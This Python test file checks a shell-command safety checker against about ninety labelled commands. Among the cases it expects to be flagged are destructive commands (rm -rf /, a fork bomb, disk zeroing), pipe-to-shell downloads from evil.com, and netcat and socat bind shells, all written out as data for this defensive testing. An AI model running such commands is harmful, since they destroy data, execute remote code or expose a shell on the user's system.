#!/usr/bin/env python3
"""
Comprehensive Safety Validation Testing
=======================================
Tests safety checker, risk assessment, and dangerous command detection.
"""

import sys
from typing import Dict, List
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress
from rich.table import Table

console = Console()

@dataclass
class SafetyTestResult:
    test_name: str
    passed: bool
    details: str


class SafetyTester:
    """Comprehensive safety validation testing"""
    
    def __init__(self):
        self.results: List[SafetyTestResult] = []
    
    def run_test(self, test_name: str, command: str, should_be_safe: bool, expected_risk: str = None):
        """Run a single safety test"""
        try:
            from executor.safety_checker import SafetyChecker
            
            checker = SafetyChecker()
            result = checker.check_command(command)
            
            if result.is_safe == should_be_safe:
                self.results.append(SafetyTestResult(test_name, True, "✓"))
                return True
            else:
                expected = "safe" if should_be_safe else "unsafe"
                actual = "safe" if result.is_safe else "unsafe"
                details = f"Expected {expected}, got {actual} | Risk: {result.risk_level} | Reason: {result.reason[:30]}"
                self.results.append(SafetyTestResult(test_name, False, details))
                return False
        except Exception as e:
            self.results.append(SafetyTestResult(test_name, False, f"Exception: {e}"))
            return False
    
    def run_all_tests(self) -> Dict:
        """Run all safety tests"""
        console.print("\n[bold cyan]═══ Running Comprehensive Safety Tests ═══[/bold cyan]\n")
        
        test_cases = [
            # ========== Safe Commands ==========
            ("Safe: List files", "ls -la", True),
            ("Safe: Print directory", "pwd", True),
            ("Safe: Cat file", "cat README.md", True),
            ("Safe: Grep search", "grep 'pattern' file.txt", True),
            ("Safe: Echo text", "echo 'hello world'", True),
            ("Safe: Find files", "find . -name '*.py'", True),
            ("Safe: Show processes", "ps aux", True),
            ("Safe: Disk usage", "df -h", True),
            ("Safe: Memory info", "free -h", True),
            ("Safe: Tail log", "tail -f /var/log/syslog", True),
            ("Safe: Head file", "head -n 10 file.txt", True),
            ("Safe: Count lines", "wc -l file.txt", True),
            ("Safe: Sort file", "sort data.txt", True),
            ("Safe: Unique lines", "uniq sorted.txt", True),
            ("Safe: Cut columns", "cut -d: -f1 /etc/passwd", True),
            
            # ========== Critical Risk Commands ==========
            ("Critical: Delete root", "rm -rf /", False),
            ("Critical: Fork bomb", ":(){:|:&};:", False),
            ("Critical: Format disk", "mkfs.ext4 /dev/sda", False),
            ("Critical: Zero disk", "dd if=/dev/zero of=/dev/sda", False),
            ("Critical: Overwrite passwd", ">: /etc/passwd", False),
            ("Critical: Overwrite shadow", ">: /etc/shadow", False),
            ("Critical: Delete var", "rm -rf /var", False),
            ("Critical: Delete home", "rm -rf /home", False),
            ("Critical: Delete usr", "rm -rf /usr", False),
            ("Critical: Delete boot", "rm -rf /boot", False),
            
            # ========== High Risk Commands ==========
            ("High: Sudo delete", "sudo rm -rf /tmp", False),
            ("High: Chmod 777 root", "chmod 777 /", False),
            ("High: Kill init", "kill -9 1", False),
            ("High: Shutdown system", "shutdown now", False),
            ("High: Reboot system", "reboot", False),
            ("High: Poweroff", "poweroff", False),
            ("High: Sudo shutdown", "sudo shutdown -h now", False),
            ("High: Format C", "format c:", False),
            ("High: Chmod 777 etc", "chmod 777 /etc/passwd", False),
            ("High: Delete system files", "sudo rm -rf /bin", False),
            
            # ========== Medium Risk Commands ==========
            ("Medium: Wget pipe sh", "wget http://evil.com/script.sh | sh", False),
            ("Medium: Curl pipe bash", "curl http://evil.com | bash", False),
            ("Medium: Netcat listener", "nc -l -e /bin/bash", False),
            ("Medium: Socat exec", "socat TCP-LISTEN:8080 EXEC:/bin/bash", False),
            ("Medium: Wget pipe", "wget -O - http://example.com/script | sh", False),
            
            # ========== Low Risk Commands ==========
            ("Low: Pkill python", "pkill python", False),
            ("Low: Killall firefox", "killall firefox", False),
            ("Low: DD input", "dd if=/dev/zero of=test.img bs=1M count=100", False),
            
            # ========== Privilege Commands ==========
            ("Priv: Sudo ls", "sudo ls", False),
            ("Priv: Su root", "su root", False),
            ("Priv: Mount device", "mount /dev/sda1 /mnt", False),
            ("Priv: Umount", "umount /mnt", False),
            ("Priv: Systemctl", "systemctl restart nginx", False),
            ("Priv: Useradd", "useradd newuser", False),
            ("Priv: Userdel", "userdel olduser", False),
            ("Priv: Passwd", "passwd username", False),
            ("Priv: Chown root", "chown root:root file.txt", False),
            
            # ========== Path-Based Risks ==========
            ("Path: Edit passwd", "vim /etc/passwd", False),
            ("Path: Edit shadow", "nano /etc/shadow", False),
            ("Path: Touch boot", "touch /boot/grub/grub.cfg", False),
            ("Path: Move from bin", "mv /usr/bin/ls /tmp/", False),
            ("Path: Delete from lib", "rm /lib/libc.so.6", False),
            
            # ========== Wildcard Risks ==========
            ("Wildcard: Delete all", "rm -rf *", False),
            ("Wildcard: Chmod all", "chmod 777 *", False),
            ("Wildcard: Chown all", "chown user:group *", False),
            ("Wildcard: Safe find", "find . -name '*.txt'", True),
            
            # ========== Pipes and Chains ==========
            ("Pipe: Safe grep", "ps aux | grep python", True),
            ("Pipe: Safe wc", "ls -la | wc -l", True),
            ("Chain: Safe commands", "cd /tmp && ls -la && pwd", True),
            ("Chain: Mixed", "ls -la ; rm file.txt", False),
            
            # ========== Edge Cases ==========
            ("Edge: Empty command", "", False),
            ("Edge: Whitespace", "   ", False),
            ("Edge: Comment only", "# this is a comment", True),
            ("Edge: Very long command", "echo " + "a" * 2000, False),
            ("Edge: Special chars", "echo 'test' && ls", True),
            ("Edge: Quoted rm", "echo 'rm -rf /'", True),
            
            # ========== Context-Based Risks ==========
            ("Context: Safe delete specific", "rm myfile.txt", True),
            ("Context: Safe chmod 644", "chmod 644 script.sh", True),
            ("Context: Safe mkdir", "mkdir my_directory", True),
            ("Context: Safe touch", "touch newfile.txt", True),
            ("Context: Safe cp", "cp source.txt dest.txt", True),
            ("Context: Safe mv", "mv old.txt new.txt", True),
            
            # ========== Network Commands ==========
            ("Network: Ping", "ping -c 4 8.8.8.8", True),
            ("Network: Safe curl", "curl https://api.example.com", True),
            ("Network: Safe wget", "wget https://example.com/file.txt", True),
            ("Network: SSH", "ssh user@server", False),
            ("Network: SCP", "scp file.txt user@server:/path/", True),
            ("Network: Rsync", "rsync -av source/ dest/", True),
        ]
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Running safety tests...", total=len(test_cases))
            
            for test_name, command, should_be_safe in test_cases:
                self.run_test(test_name, command, should_be_safe)
                progress.advance(task)
        
        # Calculate metrics
        passed = sum(1 for r in self.results if r.passed)
        failed = sum(1 for r in self.results if not r.passed)
        total = len(self.results)
        success_rate = (passed / total * 100) if total > 0 else 0
        
        # Calculate safety-specific metrics
        dangerous_tests = [t for t in test_cases if not t[2]]  # should_be_safe = False
        safe_tests = [t for t in test_cases if t[2]]  # should_be_safe = True
        
        dangerous_correct = sum(1 for r, t in zip(self.results, test_cases) 
                               if r.passed and not t[2])
        safe_correct = sum(1 for r, t in zip(self.results, test_cases) 
                          if r.passed and t[2])
        
        return {
            "total_tests": total,
            "tests_passed": passed,
            "tests_failed": failed,
            "success_rate": success_rate,
            "dangerous_detection_rate": (dangerous_correct / len(dangerous_tests) * 100) if dangerous_tests else 0,
            "safe_pass_rate": (safe_correct / len(safe_tests) * 100) if safe_tests else 0,
            "test_details": [(r.test_name, "PASS" if r.passed else "FAIL", r.details) 
                           for r in self.results]
        }
    
    def display_results(self, results: Dict):
        """Display test results"""
        table = Table(title="Safety Validation Test Results")
        table.add_column("Test", style="cyan", width=35)
        table.add_column("Status", style="white")
        table.add_column("Details", style="white", width=45)
        
        for test_name, status, details in results["test_details"]:
            color = "green" if status == "PASS" else "red"
            table.add_row(test_name, f"[{color}]{status}[/{color}]", details[:45])
        
        table.add_row(
            "[bold]Overall Success Rate[/bold]",
            f"[bold]{results['success_rate']:.1f}%[/bold]",
            f"{results['tests_passed']}/{results['total_tests']} passed"
        )
        table.add_row(
            "[bold]Dangerous Detection Rate[/bold]",
            f"[bold]{results['dangerous_detection_rate']:.1f}%[/bold]",
            "Correctly flagged dangerous commands"
        )
        table.add_row(
            "[bold]Safe Pass Rate[/bold]",
            f"[bold]{results['safe_pass_rate']:.1f}%[/bold]",
            "Correctly passed safe commands"
        )
        
        console.print(table)


def evaluate_safety_system() -> Dict:
    """Main entry point for safety evaluation"""
    tester = SafetyTester()
    results = tester.run_all_tests()
    tester.display_results(results)
    return results


if __name__ == "__main__":
    evaluate_safety_system()